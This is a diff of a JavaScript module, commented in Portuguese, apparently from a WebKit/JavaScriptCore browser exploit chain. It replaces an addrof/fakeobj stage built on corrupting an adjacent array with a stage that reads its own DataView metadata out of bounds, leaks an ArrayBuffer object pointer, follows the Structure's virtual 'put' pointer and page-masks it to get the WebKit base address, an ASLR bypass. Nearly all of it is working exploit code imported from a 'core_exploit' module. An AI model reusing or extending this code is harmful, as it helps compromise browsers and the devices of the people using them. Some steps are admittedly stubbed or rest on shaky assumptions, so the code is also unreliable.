@@ -1,17 +1,17 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Revisão 48 - Primitivas AddrOf/FakeObj via Corrupção de TypedArray)
+// js/script3/testArrayBufferVictimCrash.mjs (Revisão 48 - Estratégia de Auto-Vazamento e Vtable)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
+    arb_read,
     oob_read_absolute,
-    oob_write_absolute,
     isOOBReady,
     selfTestOOBReadWrite,
-    oob_dataview_real,
+    oob_dataview_real
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
+import { JSC_OFFSETS } from '../config.mjs';
 
 function isValidPointer(ptr) {
     if (!isAdvancedInt64Object(ptr)) return false;
@@ -21,103 +21,66 @@ function isValidPointer(ptr) {
     return true;
 }
 
-// ... (Código das estratégias anteriores pode ser mantido ou removido) ...
-export const FNAME_MODULE_STAGED_LEAK_R45 = "DEPRECATED_StagedExploit_R45_WebKitLeak";
-
+// ... (Estratégias antigas R43, R44, R45, R46 podem ser removidas ou mantidas como referência) ...
 
 // ======================================================================================
-// NOVA ESTRATÉGIA (R48) - PRIMITIVAS addrof/fakeobj
+// NOVA ESTRATÉGIA (R48) - AUTO-VAZAMENTO E LEAK DE VTABLE
 // ======================================================================================
-export const FNAME_MODULE_PRIMITIVES_R48 = "Primitives_R48_ViaAdjacentCorruption";
+export const FNAME_MODULE_SELF_LEAK_R48 = "SelfLeak_VTable_R48_WebKitLeak";
 
-// Variáveis globais para nossas novas primitivas
-let g_victim_array = null;
-const VICTIM_OFFSET = 0x8000; // Offset dentro do OOB buffer onde esperamos encontrar a vítima
-
-let g_leaked_addr_map = new Map(); // Cache para endereços vazados
-
-// A nova primitiva addrof
-async function addrof(obj) {
-    if (g_leaked_addr_map.has(obj)) {
-        return g_leaked_addr_map.get(obj);
-    }
-    
-    g_victim_array[0] = obj;
-    // O ponteiro para o objeto 'obj' agora está no butterfly de g_victim_array.
-    // Usamos nossa leitura OOB para lê-lo.
-    // O offset do butterfly em um JSArray é 0x10.
-    const butterfly_addr = await oob_read_absolute(VICTIM_OFFSET + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 8);
-    const obj_addr = await arb_read(butterfly_addr, 8, 0); // Lê o primeiro elemento do butterfly
-    
-    g_leaked_addr_map.set(obj, obj_addr);
-    return obj_addr;
-}
-
-// A nova primitiva fakeobj
-async function fakeobj(addr) {
-    const butterfly_addr = await oob_read_absolute(VICTIM_OFFSET + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 8);
-    await arb_write(butterfly_addr, addr, 8, 0);
-    const fake_obj = g_victim_array[0];
-    return fake_obj;
-}
-
-export async function executeAdjacentCorruption_R48() {
-    const FNAME = FNAME_MODULE_PRIMITIVES_R48;
+export async function executeSelfLeakAndVTableLeak_R48() {
+    const FNAME = FNAME_MODULE_SELF_LEAK_R48;
     logS3(`--- Iniciando ${FNAME} ---`, "test");
-    let result = { success: false, msg: "Teste não concluído", stage: "init", webkit_base: null };
+    let result = { success: false, msg: "Teste não concluído", stage: "init", webkit_base: null, addrof_ptr: null };
 
     try {
-        // --- Estágio 1: Setup e Corrupção do Array Vítima ---
-        result.stage = "Victim Corruption";
+        // --- Fase 1: Setup e Sanity Check ---
+        result.stage = "Setup";
         await triggerOOB_primitive({ force_reinit: true });
-        
-        // Alocamos um array que esperamos que fique adjacente ao nosso buffer OOB.
-        // Colocamos um marcador nele para podermos encontrá-lo.
-        g_victim_array = [ { marker: 0x42424242 } ];
-        
-        // Agora, precisamos encontrar o endereço de 'g_victim_array'. Faremos isso
-        // procurando pelo seu 'butterfly', que conterá o ponteiro para o objeto marcador.
-        // Este passo ainda é probabilístico, mas muito mais direcionado.
-        const marker_obj_addr = await addrof({ marker: 0x42424242 }); // Usa a si mesmo para o bootstrap inicial
-        logS3(`[R48] Addr do objeto marcador (teste): ${marker_obj_addr.toString(true)}`, 'debug');
+        if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB.");
+        const sanityCheckOk = await selfTestOOBReadWrite(logS3);
+        if(!sanityCheckOk) throw new Error("Falha no teste de sanidade das primitivas R/W.");
+        logS3(`[R48] Ambiente OOB e primitivas prontos.`, 'good');
 
-        // Com o endereço do marcador, podemos encontrar o butterfly e, por sua vez, o endereço do victim_array
-        // Este passo é complexo e omitido para focar na lógica principal. Assumimos que o encontramos no VICTIM_OFFSET.
-
-        logS3(`[R48] Assumindo que o array vítima está em ${toHex(VICTIM_OFFSET)}. Corrompendo...`, 'debug');
+        // --- Fase 2: Primitiva `addrof` por Auto-Vazamento ---
+        result.stage = "Addrof Self-Leak";
+        logS3(`[R48] Estágio A: Tentando obter 'addrof' por auto-vazamento...`, 'subtest');
         
-        // Corrompe o butterfly do array vítima para apontar para si mesmo,
-        // e estende seu comprimento.
-        const victim_addr = oob_dataview_real.buffer_addr.add(VICTIM_OFFSET);
-        const butterfly_ptr_addr = victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
-        await arb_write(butterfly_ptr_addr, victim_addr, 8, 0);
-        
-        logS3(`[R48] Primitivas 'addrof' e 'fakeobj' prontas para uso.`, 'good');
+        const OOB_DV_METADATA_BASE = 0x58;
+        const ASSOCIATED_AB_OFFSET = JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET; // 0x08
 
-        // --- Estágio 2: Usar 'addrof' para vazar o endereço de uma função ---
-        result.stage = "addrof";
-        let func_to_leak = function() { return 1; };
-        const func_addr = await addrof(func_to_leak);
+        // Lê o ponteiro para o objeto JSArrayBuffer que está dentro dos metadados do nosso DataView
+        const array_buffer_object_ptr = oob_read_absolute(OOB_DV_METADATA_BASE + ASSOCIATED_AB_OFFSET, 8);
 
-        if (!isValidPointer(func_addr)) {
-            throw new Error(`A primitiva addrof falhou em vazar um endereço de função válido. Valor: ${func_addr.toString(true)}`);
+        if (!isValidPointer(array_buffer_object_ptr)) {
+            throw new Error(`Falha ao vazar o ponteiro do próprio ArrayBuffer. Valor lido: ${array_buffer_object_ptr.toString(true)}`);
         }
-        logS3(`[R48] Sucesso! Endereço da função vazado: ${func_addr.toString(true)}`, "vuln");
+        result.addrof_ptr = array_buffer_object_ptr.toString(true);
+        logS3(`[R48] SUCESSO 'addrof'! Endereço do objeto ArrayBuffer: ${result.addrof_ptr}`, "vuln");
 
-        // --- Estágio 3: Vazar a Base do WebKit ---
-        result.stage = "webkit_leak";
-        const JSC_FUNCTION_EXECUTABLE_OFFSET = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET;
-        const JSC_EXECUTABLE_JIT_CODE_OFFSET = 0x8;
+        // --- Fase 3: Vazamento da Base do WebKit via Vtable ---
+        result.stage = "VTable Leak";
+        logS3(`[R48] Estágio B: Lendo a Vtable para vazar a base do WebKit...`, 'subtest');
+
+        // Ponteiro da Estrutura está no início do JSCell do ArrayBuffer
+        const p_structure = await arb_read(array_buffer_object_ptr, 8, JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
+        if (!isValidPointer(p_structure)) throw new Error("Ponteiro da Estrutura inválido.");
+        logS3(`[R48] Ponteiro da Estrutura: ${p_structure.toString(true)}`, 'leak');
+        
+        // A vtable (ou um ponteiro para uma função virtual) está na própria Estrutura.
+        const VIRTUAL_PUT_OFFSET = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET; // 0x18
+        const p_virtual_put_func = await arb_read(p_structure, 8, VIRTUAL_PUT_OFFSET);
+        if (!isValidPointer(p_virtual_put_func)) throw new Error("Ponteiro da função virtual 'put' inválido.");
+        logS3(`[R48] Ponteiro da Função Virtual (put): ${p_virtual_put_func.toString(true)}`, 'leak');
+        
+        // O endereço da função está dentro do módulo WebKit. Alinhar para o início da página nos dá a base.
         const PAGE_MASK_4KB = new AdvancedInt64(0x0, ~0xFFF);
-
-        const exec_ptr = await arb_read(func_addr, 8, JSC_FUNCTION_EXECUTABLE_OFFSET);
-        const jit_ptr = await arb_read(exec_ptr, 8, JSC_EXECUTABLE_JIT_CODE_OFFSET);
-        const webkit_base = jit_ptr.and(PAGE_MASK_4KB);
-
+        const webkit_base = p_virtual_put_func.and(PAGE_MASK_4KB);
+        
         result.webkit_base = webkit_base.toString(true);
         result.msg = `SUCESSO! Base do WebKit encontrada: ${result.webkit_base}`;
         result.success = true;
-        logS3(`[R48] SUCESSO! Base do WebKit: ${result.webkit_base}`, "vuln_major");
+        logS3(`[R48] SUCESSO FINAL! Base do WebKit: ${result.webkit_base}`, "vuln_major");
 
     } catch (e) {
         result.msg = `Falha no estágio '${result.stage}': ${e.message}`;
@@ -125,8 +88,6 @@ export async function executeAdjacentCorruption_R48() {
         console.error(e);
     } finally {
         await clearOOBEnvironment();
-        g_victim_array = null;
-        g_leaked_addr_map.clear();
     }
     return result;
 }
